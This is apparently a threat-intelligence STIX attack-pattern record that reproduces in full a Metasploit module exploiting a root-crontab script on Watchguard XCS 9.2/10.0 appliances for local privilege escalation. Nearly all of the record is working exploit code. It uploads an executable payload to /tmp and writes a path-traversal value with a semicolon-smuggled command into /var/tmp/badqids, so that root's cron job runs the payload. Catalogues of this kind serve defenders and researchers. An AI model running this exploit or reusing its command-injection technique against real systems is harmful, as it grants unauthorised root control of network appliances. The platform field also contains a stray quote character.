{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7cbaf03a-cb65-4871-9343-f78b4e0ec4d4",
    "created": "2024-08-14T16:33:36.194941Z",
    "modified": "2024-08-14T16:33:36.194945Z",
    "name": "Watchguard XCS FixCorruptMail Local Privilege Escalation",
    "description": " This module exploits a vulnerability in the Watchguard XCS 'FixCorruptMail' script called by root's crontab which can be exploited to run a command as root within 3 minutes. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/freebsd/local/watchguard_fix_corrupt_mail.rb",
            "external_id": "watchguard_fix_corrupt_mail.rb"
        },
        {
            "source_name": "reference",
            "url": "http://security-assessment.com/files/documents/advisory/Watchguard-XCS-final.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  # It needs 3 minutes wait time\n  # WfsDelay set to 180, so it should be a Manual exploit,\n  # to avoid it being included in automations\n  Rank = ManualRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Watchguard XCS FixCorruptMail Local Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a vulnerability in the Watchguard XCS 'FixCorruptMail' script called\n        by root's crontab which can be exploited to run a command as root within 3 minutes.\n      },\n      'Author'         =>\n        [\n          'Daniel Jensen <daniel.jensen[at]security-assessment.com>' # discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'http://security-assessment.com/files/documents/advisory/Watchguard-XCS-final.pdf']\n        ],\n      'Platform'       => 'bsd',\n      'Arch'           => ARCH_X64,\n      'SessionTypes'   => ['shell'],\n      'Privileged'     => true,\n      'Targets'        =>\n        [\n          [ 'Watchguard XCS 9.2/10.0', { }]\n        ],\n      'DefaultOptions' => { 'WfsDelay' => 180 },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-06-29'\n    ))\n  end\n\n  def setup\n    @pl = generate_payload_exe\n\n    super\n  end\n\n  def check\n    #Basic check to see if the device is a Watchguard XCS\n    res = cmd_exec('uname -a')\n    return Exploit::CheckCode::Detected if res && res.include?('support-xcs@watchguard.com')\n\n    Exploit::CheckCode::Safe\n  end\n\n  def upload_payload\n    fname = \"/tmp/#{Rex::Text.rand_text_alpha(5)}\"\n\n    write_file(fname, @pl)\n    return nil unless file_exist?(fname)\n    cmd_exec(\"chmod +x #{fname}\")\n\n    fname\n  end\n\n  def exploit\n    print_warning('Rooting can take up to 3 minutes.')\n\n    #Generate and upload the payload\n    filename = upload_payload\n    fail_with(Failure::NotFound, 'Payload failed to upload') if filename.nil?\n    print_status(\"Payload #{filename} uploaded.\")\n\n    #Sets up empty dummy file needed for privesc\n    dummy_filename = \"/tmp/#{Rex::Text.rand_text_alpha(5)}\"\n    cmd_exec(\"touch #{dummy_filename}\")\n    vprint_status('Added dummy file')\n\n    #Put the shell injection line into badqids\n    #setup_privesc = \"echo \\\"../../../../../..#{dummy_filename};#{filename}\\\" > /var/tmp/badqids\"\n    badqids = write_file('/var/tmp/badqids', \"../../../../../..#{dummy_filename};#{filename}\")\n    fail_with(Failure::NotFound, 'Failed to create badqids file to exploit crontab') if badqids.nil?\n    print_status('Badqids created, waiting for vulnerable script to be called by crontab...')\n    #cmd_exec(setup_privesc)\n\n    #Cleanup the files we used\n    register_file_for_cleanup('/var/tmp/badqids')\n    register_file_for_cleanup(dummy_filename)\n    register_file_for_cleanup(filename)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-06-29",
    "x_mitre_platforms": [
        "bsd'"
    ]
}